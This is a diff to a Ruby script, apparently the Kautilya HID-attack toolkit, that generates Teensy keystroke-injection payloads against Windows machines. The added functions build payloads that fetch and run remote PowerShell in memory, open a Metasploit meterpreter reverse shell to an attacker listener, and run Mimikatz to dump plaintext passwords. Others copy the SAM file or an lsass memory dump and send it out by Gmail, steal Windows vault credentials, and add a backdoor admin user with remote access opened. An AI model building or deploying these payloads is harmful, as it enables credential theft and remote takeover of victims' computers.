@@ -1,4 +1,5 @@
 require "rubygems"
+require 'bundler/setup'
 require "colored"
 require "highline/import"
 
@@ -35,8 +36,9 @@ def search_replace(filein,fileout,*param)
  teensydefsfile = File.read("./lib/src/methodsdefs")
  input = input.gsub(/DEFS/,teensydefsfile)
  input = input.gsub(/BOARDTYPE/,board)
- File.new(fileout,"w")
+ file = File.new(fileout,"w")
  File.open(fileout,"w") {|f| f.puts input}
+ file.close
  puts"\nNow copy the generated #{fileout} to your HID.".cyan.bold
  puts"\nPress return to return to Main Menu.".yellow.bold
  gets
@@ -143,14 +145,14 @@ def edit_hosts()
 end
 
 def enable_rdp()
-  puts"\nThis payload adds an Admiistrative User, Starts RDP Service and adds exception to Windows firewall.".bold
+  puts"\nThis payload adds an Administrative User, Starts RDP Service and adds exception to Windows firewall.".bold
   username = input("Enter Username for the user to be added: ")
   password = input_pass("Enter password for the user to be added: ")
   search_replace("./lib/src/enable_rdp.pde","#$output_path/output/enable_rdp.pde",username,password)
 end
 
 def enable_telnet()
-  puts"\nThis payload adds an Admiistrative User, installs and starts telnet server and adds exception to Windows firewall.".bold
+  puts"\nThis payload adds an Administrative User, installs and starts telnet server and adds exception to Windows firewall.".bold
   username = input("Enter Username for the user to be added: ")
   password = input_pass("Enter password for the user to be added: ")
   search_replace("./lib/src/enable_telnet.pde","#$output_path/output/enable_telnet.pde",username,password)
@@ -395,9 +397,10 @@ def dns_txt_backdoor
 end
 
 def download_execute_ps()
-  puts"\nThis payload downloads a powershell script from a url and executes it.".bold
+  puts"\nThis payload downloads a powershell script from a url and executes it in memory.".bold
   url = input("Enter the URL where the powershell script is hosted (for pastebin use raw format like http://pastebin.com/raw.php?i=NfiBdUp9: ")
-  search_replace("./lib/src/download_execute_ps.ino","#$output_path/output/download_execute_ps.ino",url)
+  arg = input("Enter the arguments to pass to the script: ")
+  search_replace("./lib/src/download_execute_ps.ino","#$output_path/output/download_execute_ps.ino",url,arg)
 end
 
 def remove_update()
@@ -420,7 +423,7 @@ end
 
 def screenshot()
   puts"\nThis payload takes screenshots from the target system at a given interval and uploads it to a FTP server after a given time interval.".bold
-  puts"It is based on Get-TimedScreenshot from powersploit.".bold
+  puts"It is based on Get-TimedScreenshot from Powersploit (https://github.com/mattifestation/PowerSploit/)".bold
   puts"The code was submitted by Christian Schneider (@busbauen) and has been modified for Kautilya. \n".bold
   screeninterval = input("Enter the time interval in seconds for screenshots to be taken: ")
   time = input("Enter the time interval in seconds for packets to be uploaded to ftp: ")
@@ -429,6 +432,77 @@ def screenshot()
   server = input("Enter IP address of the ftp server: ")
   directory = input("Name of the directory on the FTP Server where screenshots could be uploaded: ")
   search_replace("./lib/src/screenshot.ino","#$output_path/output/screenshot.ino",screeninterval,time,username,password,server,directory)
+end
+
+def invoke_shellcode
+  puts"\nThis payload could be used tp execute shellcode in memory.".bold
+  puts"The script uses Invoke-Shellcode.ps1 which could be found in the extras directory."
+  puts"By default, it connects back to the given IP and port and uses metasploit windows/meterpreter/reverse_https shellcode."
+  puts"See help of Invoke-Shellcode.ps1 in extras directory for additional arguments."
+  puts"Invoke-Shellcode script is part of Powersploit (https://github.com/mattifestation/PowerSploit/)"
+  url = input("Enter the URL where the powershell script is hosted (for pastebin use raw format like http://pastebin.com/raw.php?i=NfiBdUp9: ")
+  ip = input("Enter the IP address of metasploit listener: ")
+  port = input("Enter the port of the metasploit listener: ")
+  arg = "(Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost #{ip} -Lport #{port} -Force)"
+  search_replace("./lib/src/download_execute_ps.ino","#$output_path/output/invoke_shellcode.ino",url,arg)
+end
+
+def dump_passwords()
+  puts"\nThis payload could be used to execute Mimikatz in memory.".bold
+  puts"The script uses Invoke-Mimikatz.ps1 which could be found in the extras directory."
+  puts"By default, it dumps user passwords in plain, See help of Invoke-Mimikatz.ps1 in extras directory for additional arguments."
+  puts"Invoke-Mimikatz is written by Joseph Bialek (https://github.com/clymb3r/PowerShell/) and is a part of powersploit.)"
+  url = input("Enter the URL where the powershell script is hosted (for pastebin use raw format like http://pastebin.com/raw.php?i=NfiBdUp9: ")
+  arg = input("Enter the arguments to pass to the script (hit Enter for default action i.e. dump passwords): ")
+  if (arg == "")
+    arg = "Invoke-Mimikatz"
+  end
+  outopt,username,password,devkey = outoption()
+  search_replace("./lib/src/dump_passwords.ino","#$output_path/output/dump_passwords.ino",outopt,username,password,devkey,url,arg)
+end
+
+def vss()
+  puts"\nThis payload uses the Volume Shadows Service to create a copy of the SAM file.".bold
+  puts"\n The SAM file could be exfiltrated only using gmail."
+  outopt,username,password,devkey = outoption()
+  if (outopt == "gmail" or outopt == "noexfil")
+    search_replace("./lib/src/vss.ino","#$output_path/output/vss.ino",outopt,username,password,devkey)
+  elsif
+    puts"\n Please use gmail as SAM file would be sent as an attachment.".bold
+  end
+end
+
+def memdump()
+  puts"\nThis payload generate a dull memory minidump of a process".bold
+  puts"The memory dump could be used to find juicy information from the memory."
+  puts"By default, dumps memory of the lsass process. It could be exfiltrated using gmail."
+  puts"The code has been taken from Out-Minidump.ps1 from Powersploit (https://github.com/mattifestation/PowerSploit/)"
+  outopt,username,password,devkey = outoption()
+  arg = input("Enter process to be dumped (hit Enter for default i.e. lsass): ")
+  if (arg == "")
+    arg = "lsass"
+  end
+  if (outopt == "gmail" or outopt == "noexfil")
+    search_replace("./lib/src/memdump.ino","#$output_path/output/memdump.ino",outopt,username,password,devkey,arg)
+  elsif
+    puts"\n Please use gmail as the dump file would be sent as an attachment.".bold
+  end
+end
+
+def getvault
+  puts"\nThis payload dumps credentials from Windows vault with web creds in plain.".bold
+  puts"The script uses Get-VaultCredential which could be found in the extras directory."
+  puts"The code has been taken from Get-VaultCredential.ps1 from Powersploit (https://github.com/mattifestation/PowerSploit/)"
+  url = input("Enter the URL where the powershell script is hosted (for pastebin use raw format like http://pastebin.com/raw.php?i=NfiBdUp9: ")
+  outopt,username,password,devkey = outoption()
+  search_replace("./lib/src/getvault.ino","#$output_path/output/getvault.ino",outopt,username,password,devkey,url)
+end
+
+def enable_psremoting
+  puts"\nThis payload adds an Administrative User, configures Powershell remoting and adds exception to Windows firewall.".bold
+  username = input("Enter Username for the user to be added: ")
+  password = input_pass("Enter password for the user to be added: ")
+  search_replace("./lib/src/enable_psremoting.ino","#$output_path/output/enable_psremoting.ino",username,password)
 end
 
 def linux_download_execute
